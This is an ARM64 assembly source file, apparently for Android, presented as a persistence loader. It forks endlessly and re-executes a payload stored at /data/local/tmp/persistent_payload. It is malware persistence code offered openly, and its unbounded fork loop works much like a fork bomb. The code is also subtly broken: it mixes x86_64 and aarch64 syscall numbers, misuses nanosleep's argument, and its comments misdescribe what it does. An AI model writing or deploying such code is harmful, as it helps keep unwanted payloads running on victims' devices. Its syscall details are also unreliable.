/*
 * persistent_module_loader.s - Persistent Module Loader
 *
 * This module demonstrates persistence by forking and then re-executing itself using execve.
 * The child process re-spawns the persistent payload if it terminates.
 *
 * Syscalls used: fork (57), execve (221), nanosleep (35) for a delay loop.
 *
 * NOTE: The execve call uses a hardcoded path "/data/local/tmp/persistent_payload"
 * which should match the installed filename of this payload.
 */
 
.section .data
path:
    .asciz "/data/local/tmp/persistent_payload\0"
args:
    .quad path, 0       /* NULL-terminated argument array */
delay:
    .quad 200000000     /* nanoseconds delay (~0.2 sec) */
msg_spawn:
    .asciz "Persistent Loader: Re-spawned child process\n"

.section .text
.global main
main:
    /* Fork the process */
    mov x8, #57         /* fork syscall */
    svc 0
    cmp x0, #0
    beq child_proc      /* In child, x0 == 0 */
    /* Parent: Sleep for a short period before re-forking */
    mov x0, delay       /* pointer to delay struct */
    mov x8, #35         /* nanosleep syscall */
    svc 0
    b main              /* Loop to fork repeatedly */

child_proc:
    /* In child, call execve to re-spawn the payload */
    adr x0, path        /* File path */
    adr x1, args        /* Argument array */
    mov x2, #0          /* No environment variables */
    mov x8, #221        /* execve syscall */
    svc 0
    /* If execve fails, print message and exit */
    mov x0, #1
    adr x1, msg_spawn
    mov x2, #44
    mov x8, #64
    svc 0
    mov x0, #1
    mov x8, #93
    svc 0
